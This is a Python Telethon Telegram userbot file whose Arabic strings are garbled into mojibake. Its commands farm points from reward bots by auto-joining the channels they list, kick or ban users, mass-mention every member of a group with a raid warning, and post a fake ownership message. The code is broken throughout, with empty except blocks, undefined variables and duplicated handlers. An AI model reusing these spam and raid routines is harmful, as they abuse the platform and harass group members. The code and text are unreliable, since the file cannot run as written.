        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿßÿ®|ÿ™ÿ¨ŸÖŸäÿπ ÿπŸÇÿßÿ®)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿπŸÇÿßÿ® , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    channel_entity = await event.client.get_entity('@MARKTEBOT')
    await event.client.send_message('@MARKTEBOT', '/start')
    await asyncio.sleep(4)
    msg0 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    msg1 = await event.client.get_messages('@MARKTEBOT', limit=1)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            msg2 = await event.client.get_messages('@MARKTEBOT', limit=1)
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  
    
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸÑŸäŸàŸÜ|ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸÑŸäŸàŸÜ)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑŸÖŸÑŸäŸàŸÜ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    await asyncio.sleep(4)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  
    

#    else:
  #      await event.edit("Ÿäÿ¨ÿ® ÿßŸÑÿØŸÅÿπ ŸÑÿßÿ≥ÿ™ÿπŸÖÿßŸÑ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± !")
@client.on(events.NewMessage(pattern="(.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπÿ±ÿ®|ÿ™ÿ¨ŸÖŸäÿπ ÿπÿ±ÿ®)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßŸÑÿπÿ±ÿ® , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    await asyncio.sleep(4)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    await msg1[0].click(0)

    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break

        url = msgs.reply_markup.rows[0].buttons[0].url

        try:
            try:
                await l313l(JoinChannelRequest(url))
            except:
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")

    await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
@client.on(events.NewMessage(pattern=".ÿ™ÿ¨ŸÖŸäÿπ ÿØÿπŸÖŸÉŸÖ"))
async def ÿ™ÿ¨ŸÖŸäÿπ_ÿØÿπŸÖŸÉŸÖ(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿØÿπŸÖŸÉŸÖ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")

    await asyncio.sleep(4)
    await msg0[0].click(1)
    await asyncio.sleep(4)
    await msg1[0].click(0)
    ŸÇŸÜŸàÿßÿ™_ŸÖÿ¨ŸÖÿπÿ© = 1
    for _ in range(100):
        await asyncio.sleep(4)
        list = await l313l(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ÿ≠ÿßŸÑŸäÿßŸã ü§ç') != -1:
            await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        msg_text = msgs.message
        if "ÿßÿ¥ÿ™ÿ±ŸÉ ŸÅÿßŸÑŸÇŸÜÿßÿ© @" in msg_text:
            ŸÇŸÜÿßÿ© = msg_text.split('@')[1].split()[0]
            try:
                entity = await l313l.get_entity(ŸÇŸÜÿßÿ©)
                if entity:
                    await l313l(JoinChannelRequest(entity.id))
                    await asyncio.sleep(4)
                    await msg2[0].click(text='ÿßÿ¥ÿ™ÿ±ŸÉÿ™ ‚úÖ')
                    ŸÇŸÜŸàÿßÿ™_ŸÖÿ¨ŸÖÿπÿ© += 1
                    await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∏ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {ŸÇŸÜŸàÿßÿ™_ŸÖÿ¨ŸÖÿπÿ©}")
            except Exception as e:
                await l313l.send_message(event.chat_id, f"**ÿÆÿ∑ÿ£ , ŸÖŸÖŸÉŸÜ ÿ™ÿ®ŸÜÿØÿ™** {str(e)}")
                break
    await l313l.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
               
@client.on(events.NewMessage(pattern="(ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿßÿ≥ÿßÿ≥ŸäŸÑ|.ÿ™ÿ¨ŸÖŸäÿπ ÿßÿ≥ÿßÿ≥ŸäŸÑ)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ÿßÿ≥ÿßÿ≥ŸäŸÑ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    await asyncio.sleep(4)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  


@client.on(events.NewMessage(pattern="(ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸáÿØŸàŸäŸàŸÜ|.ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸáÿØŸàŸäŸàŸÜ)"))
async def _(event):
    await event.edit("**‚éôÔ∏ôÿ≥Ÿäÿ™ŸÖ ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ŸÖŸÜ ÿ®Ÿàÿ™ ŸÖŸáÿØŸàŸäŸàŸÜ , ŸÇÿ®ŸÑ ŸÉŸÑ ÿ¥Ÿä ÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÜŸÉ ŸÇŸÖÿ™ ÿ®ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿßŸÑŸâ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿä ŸÑŸÑÿ®Ÿàÿ™ ŸÑÿπÿØŸÖ ÿ≠ÿØŸàÿ´ ÿßÿÆÿ∑ÿßÿ°**")
    await asyncio.sleep(4)
    await msg0[0].click(2)
    await asyncio.sleep(4)
    await msg1[0].click(0)
    chs = 1
    for i in range(100):
        await asyncio.sleep(4)
        list = await event.client(GetHistoryRequest(peer=channel_entity, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        msgs = list.messages[0]
        if msgs.message.find('ŸÑÿß ŸäŸàÿ¨ÿØ ŸÇŸÜŸàÿßÿ™ ŸÅŸä ÿßŸÑŸàŸÇÿ™ ÿßŸÑÿ≠ÿßŸÑŸä , ŸÇŸÖ ÿ®ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ÿ∑ÿ±ŸäŸÇÿ© ŸÖÿÆÿ™ŸÑŸÅÿ©') != -1:
            await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")
            break
        url = msgs.reply_markup.rows[0].buttons[0].url
        try:
            try:
                await event.client(JoinChannelRequest(url))
            except:
            await msg2[0].click(text='ÿ™ÿ≠ŸÇŸÇ')
            chs += 1
            await event.edit(f"ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ŸÅŸä {chs} ŸÇŸÜÿßÿ©")
        except:
            await msg2[0].click(text='ÿßŸÑÿ™ÿßŸÑŸä')
            chs += 1
            await event.edit(f"ÿßŸÑŸÇŸÜÿßÿ© ÿ±ŸÇŸÖ {chs}")  
    await event.client.send_message(event.chat_id, "ÿ™ŸÖ ÿßŸÑÿßŸÜÿ™Ÿáÿßÿ° ŸÖŸÜ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ")

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ") and str(event.sender_id) in ConsoleJoker:
        await event.reply("** ‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿπŸÖŸÑŸäÿ© ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÜŸÇÿßÿ∑ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úì**")  
         
@client.on(events.NewMessage(outgoing=True, pattern=r'\.(ÿ≠ÿ∏ÿ±|ÿ∑ÿ±ÿØ|ÿ™ŸÇŸäŸäÿØ)'))
async def runkick(event):
    await event.edit("ÿ¨ÿßÿ±Ÿç...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ.")
                            return
            else:  
                await event.respond("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑÿßÿ™ŸÖÿßŸÖ ÿßŸÑÿßŸÖÿ±")
                return

    
    if targetuser == 6383191007:
        return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    getreason = event.message.raw_text.splitlines()
    replacecmd = getreason[0].replace(f".{command} ", "")
    reason = replacecmd.splitlines()[0]
    client.parse_mode = "html"

    try:
        if command == "ÿ∑ÿ±ÿØ":
            await event.client.kick_participant(messagelocation, targetuser)
            action = "‚éâ‚ïé ÿ™ŸÖ ÿ≠ÿ∏ÿ±"
        elif command == "ÿ≠ÿ∏ÿ±":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=True)))
            action = "‚éâ‚ïé ÿ™ŸÖ ÿ≠ÿ∏ÿ±Ÿá"
        elif command == "ÿ™ŸÇŸäŸäÿØ":
            await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, send_messages=True)))
            action = "‚éâ‚ïé ÿ™ŸÖ ÿ™ŸÇŸäŸäÿØŸá"

        if reason:
            if f".{command}" in reason:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")
            else:
                await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}\nÿ≥ÿ®ÿ®: {reason}")
        else:
            await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")


@client.on(events.NewMessage(outgoing=True, pattern=r'\.(ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ≠ÿ∏ÿ±|ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ™ŸÇŸäŸäÿØ)'))
async def unrunkick(event):
    await event.edit("ÿ¨ÿßÿ±Ÿç...")
    await event.delete()
    command = event.pattern_match.group(1)
    getmessage = await event.get_reply_message()

    if getmessage:
        targetuser = getmessage.sender_id
    else:  
        try:
            targetuser = int(event.text.split(" ", 1)[1])
        except (ValueError, IndexError):
            if event.message.entities:
                for entity in event.message.entities:
                    if hasattr(entity, 'user_id'):
                        targetuser = entity.user_id
                        break
                    elif hasattr(entity, 'username'):
                        try:
                            targetuser = (await client.get_entity(entity.username)).id
                            break
                        except ValueError:
                            await event.respond("ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®Ÿáÿ∞ÿß ÿßŸÑÿßÿ≥ŸÖ.")
                            return
            else: 
                await event.respond(". Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ")
                return

    
    if targetuser == 6383191007:
        return

    targetdetails = await client(GetFullUserRequest(targetuser))
    messagelocation = event.to_id
    client.parse_mode = "html"

    try:
        await client(EditBannedRequest(messagelocation, targetuser, ChatBannedRights(until_date=None, view_messages=False, send_messages=False)))

        if command == "ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ≠ÿ∏ÿ±":
            action = "‚éâ‚ïé ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ±Ÿá"
        elif command == "ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ™ŸÇŸäŸäÿØ":
            action = "‚éâ‚ïé ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØŸá"

        await event.client.send_message(messagelocation, f"<a href='tg://user?id={targetuser}'>{targetdetails.users[0].first_name}</a> {action}")

    except Exception as e:
        await event.respond(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£: {e}")

    client.parse_mode = "markdown"
                                                                    
@client.on(events.NewMessage(pattern=".ÿ™ŸÅŸÑŸäÿ¥(?:\s|$)([\s\S]*)"))
async def kickall(event):
    chat_id = event.chat_id
    if event.is_private:
        return await edit_or_reply(event, "** ‚éôÔ∏ô Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± Ÿäÿ≥ÿ™ÿπŸÖŸÑ ŸÑŸÑŸÇŸÜŸàÿßÿ™ ŸàÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ŸÅŸÇÿ∑ !**")
    msg = "ÿ™ÿ≠ÿ∞Ÿäÿ±: Ÿáÿ∞ÿß ÿßŸÑŸÉÿ±Ÿàÿ® ÿ£Ÿà ÿßŸÑŸÇŸÜÿßÿ© ÿ≥Ÿäÿ™ŸÖ ÿ™ŸÅŸÑŸäÿ¥Ÿá!"
    async for usr in client.iter_participants(chat_id):
        userb = usr.username
        usrtxt = f"{msg} @{userb}"
        if str(userb) == "None":
            userb = usr.id
            usrtxt = f"{msg} {userb}"
        await client.send_message(chat_id, usrtxt)
        await asyncio.sleep(1)
    await event.delete()                                                                          


@client.on(events.NewMessage(pattern=r".ÿ±ŸÅÿπ ŸÖÿßŸÑŸÉ(?:\s|$)([\s\S]*)"))
async def permalink(event):
    user = await event.client.get_entity(event.sender_id)
    if not user:
        return
    
    
    blocked_ids = [6383191007, 6383191007]  
    
    if user.id in blocked_ids:
        return await event.edit("**ŸÑŸÉŸÉ ÿØŸä Ÿáÿ∞ÿß ÿßŸÑŸÖÿ∑Ÿàÿ±**")
    
    JoKeRUB = user.first_name.replace("\u2060", "") if user.first_name else user.username
    me = await event.client.get_me()
    my_first = me.first_name
    my_mention = f"[{me.first_name}](tg://user?id={me.id})"
    
    await event.edit(f"**‚éôÔ∏ô ÿßŸÑÿ≠ŸÑŸà** „Äå[{JoKeRUB}](tg://user?id={user.id})„Äç \n"
                     f"**‚éôÔ∏ô ÿ™ŸÄŸÖ ÿ±ŸÅÿπŸá ŸÖÿßŸÑŸÉ ÿßŸÑŸÉÿ±Ÿàÿ® ÿ®Ÿàÿßÿ≥ÿ∑ÿ© :** {my_mention}")

rehu = [
    "ÿ¥ŸÉŸÖ ŸÖÿ±Ÿá ŸÉÿ™ŸÑŸÉ ÿÆŸÑŸä ŸÜŸÅŸÑÿ¥ ÿßŸÑŸÉÿ±Ÿàÿ®",
    "ÿ®ÿßÿπ Ÿáÿ∞ÿß ÿßŸÑŸÑŸàŸÉŸä ÿ¥ÿØŸäÿ≥ŸàŸä",
